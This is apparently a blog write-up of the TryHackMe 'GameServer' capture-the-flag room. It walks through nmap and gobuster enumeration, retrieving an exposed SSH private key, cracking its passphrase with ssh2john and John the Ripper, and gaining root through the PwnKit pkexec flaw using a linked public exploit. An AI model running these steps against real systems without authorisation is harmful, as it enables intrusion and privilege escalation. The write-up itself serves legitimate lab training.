---
layout: post
title: "TryHackMe: GameServer"
date: 2025-11-29 23:00:00 +0530
categories: [TryHackMe]
tags: [tryhackme, gamingserver, ctf, walkthrough, linux, privilege-escalation, web-enumeration, ssh, hacking, writeup]
render_with_liquid: false
media_subpath: /images/GamingServer/
description: "Explore a gaming server and gain access to root by exploiting vulnerabilities, leveraging web enumeration, SSH access, and privilege escalation techniques."
---

# TryHackMe: GameServer CTF — Writeup | 29 November 2025

<div align="center">
    <img src="THM.png" alt="TryHackMe Logo" width="900"/>
    <img src="GamingServer.png" alt="Room Banner" width="600"/>
</div>

---

## Overview
Gain access to a gaming server by exploiting vulnerabilities.
Chain together web enumeration, SSH access, and privilege escalation techniques to gain root access.

---

## Reconnaissance & Scanning

### Nmap

Perform a full port and service scan:

```bash
sudo nmap -Pn -T4 -n -sC -sV -p- -oN scan_nmap.txt 10.48.160.66
```

**Scan Summary:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We got two web services running on ports 80 and 22.
- 22/tcp: OpenSSH 7.6p1
- 80/tcp: Apache httpd 2.4.29 ((Ubuntu)) with title "House of danak"
---

## Home Page 
Accessing the web application on port 80, we see a simple page with the title "House of danak"
<div align="center">
    <img src="home_page.png" alt="Home Page" width="600"/>
</div>

In home page source code, we see a hidden directory named "john"

<div align="center">
    <img src="home_page_source.png" alt="Home Page Source Code" width="600"/>
</div>

---

## Web Enumeration
Scan the web application using Gobuster:

```bash
gobuster dir -u http://10.48.160.66/ \           
    -w /usr/share/wordlists/dirb/common.txt \
    -o dir_results_common -t 25 
```
**Gobuster Results:**

```
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 313] [--> http://10.48.160.66/secret/]
/server-status        (Status: 403) [Size: 277]
/uploads              (Status: 301) [Size: 314] [--> http://10.48.160.66/uploads/]
```

We can see the sercet directory is present and can be accessed at http://10.48.160.66/secret/

<div align="center">
    <img src="sercet_page.png" alt="Gobuster Results" width="600"/>
</div>

In serecet directory, we see a file named "sercetKey"
Let's try to get the sercetKey file.
<div align="center">
    <img src="sercet_key.png" alt="Gobuster Results" width="600"/>
</div>

let's try to login using the sercetKey file. In ssh port 22, with the username `john` that we found in the source code. 
```bash
ssh -i sercetKey john@<IP_ADDRESS>
```

<div align="center">
    <img src="ssh.png" alt="Gobuster Results" width="600"/> 
</div>

But we want passphrase for login.
So, now let crack the passphrase, usint `ssh2john` command.

```bash
ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

<div align="center">
    <img src="john.png" alt="Gobuster Results" width="600"/>
</div>


Now we get the passphrase
Now let's login using the passphrase in ssh.
<div align="center">
    <img src="logged_in.png" alt="ssh Results" width="600"/>
</div>

We get logged in successfully as `john`.

Now let's try to get the flag.

## User Flag
<div align="center">
    <img src="user_flag.png" alt="Gobuster Results" width="600"/>
</div>

## Privilege Escalation
let's try `find` command to find suid files.
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Result:
```bash
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/newuidmap
```
We found pkexec file. we know pkexec is a SUID binary and have privilege escalation vulnerability.
Now let's try to exploit using PwnKit vulnerability. here is the github link for exploit: https://github.com/ly4k/PwnKit?tab=readme-ov-file
<div align="center">
    <img src="pwnkit_exploit.png" alt="Gobuster Results" width="600"/>  
</div>

we get root access.

Now let's try to get the flag.

## Root Flag

<div align="center">
    <img src="root_flag.png" alt="Gobuster Results" width="600"/>
</div>

---


## Room Complete!

<div align="center">
    <img src="completed.png" alt="Completed" width="800"/>
</div>

## Happy Hacking!

<div align="center">
    <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Nocmo3cWpreDZlbjFuenhsb2o4NW54OHptdjRnY3kxaWZzaGM2OSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Rpl1sod1vCXK0L2SUN/giphy.gif" alt="Hacking GIF" width="800"/>
</div>
